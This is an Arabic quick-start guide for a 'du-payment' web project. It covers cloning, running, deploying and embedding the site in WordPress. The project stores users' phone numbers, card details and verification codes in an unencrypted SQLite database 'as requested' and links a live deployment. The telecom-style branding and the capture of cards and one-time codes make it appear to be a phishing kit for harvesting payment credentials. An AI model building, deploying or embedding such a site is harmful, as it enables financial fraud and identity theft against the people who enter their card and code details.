# Quick Start Guide - دليل البدء السريع

## 🚀 تشغيل سريع (5 دقائق)

### 1. تحميل المشروع
```bash
git clone https://github.com/du53344/duuu.git
cd duuu
```

### 2. تثبيت التبعيات
```bash
# تثبيت تبعيات الخادم الخلفي
cd du-payment-backend
npm install

# تثبيت تبعيات الواجهة الأمامية
cd ../du-payment-site
npm install
```

### 3. تشغيل المشروع
```bash
# تشغيل الخادم الخلفي (في terminal منفصل)
cd du-payment-backend
npm start

# تشغيل الواجهة الأمامية (في terminal آخر)
cd du-payment-site
npm run dev
```

### 4. فتح الموقع
- الواجهة الأمامية: http://localhost:5173
- الخادم الخلفي: http://localhost:3000

## 🌐 للنشر على الإنتاج

### بناء الملفات للإنتاج:
```bash
cd du-payment-site
npm run build
```

### رفع على الخادم:
1. ارفع مجلد `du-payment-backend` كاملاً
2. ارفع محتويات مجلد `du-payment-site/dist` إلى المجلد العام
3. شغل الخادم الخلفي: `npm start`

## 📱 للتضمين في WordPress

### الطريقة السهلة - Iframe:
```html
<iframe src="https://your-domain.com/du-payment" width="100%" height="600px"></iframe>
```

### الطريقة المتقدمة - Shortcode:
1. انسخ ملفات الواجهة إلى مجلد القالب
2. أنشئ shortcode مخصص
3. استخدم `[du_payment]` في أي صفحة

## 🔧 تخصيص سريع

### تغيير الألوان:
- عدل ملف `du-payment-site/src/index.css`
- ابحث عن متغيرات CSS وغيرها

### تغيير النصوص:
- عدل ملفات المكونات في `du-payment-site/src/pages/`

### إضافة خطوات جديدة:
1. أنشئ مكون React جديد
2. أضف route في `App.tsx`
3. أضف endpoint في الخادم الخلفي

## 🗄️ قاعدة البيانات

- **النوع**: SQLite (ملف محلي)
- **الموقع**: `du-payment-backend/du_payment_data.db`
- **الجداول**: phone_numbers, card_details, verification_codes, sessions

### عرض البيانات:
```bash
cd du-payment-backend
sqlite3 du_payment_data.db
.tables
SELECT * FROM phone_numbers;
```

## 🔒 الأمان

- البيانات تُحفظ بدون تشفير (كما طُلب)
- قاعدة البيانات محلية
- CORS مُكوّن للسماح بالطلبات

## 📞 الدعم

- **الموقع المباشر**: https://pqfharcu.manus.space
- **الكود المصدري**: https://github.com/du53344/duuu
- **التوثيق الكامل**: README.md

---
**ملاحظة**: هذا المشروع جاهز للاستخدام فوراً ويحتوي على جميع ما يلزم للتشغيل والتضمين في أي موقع.

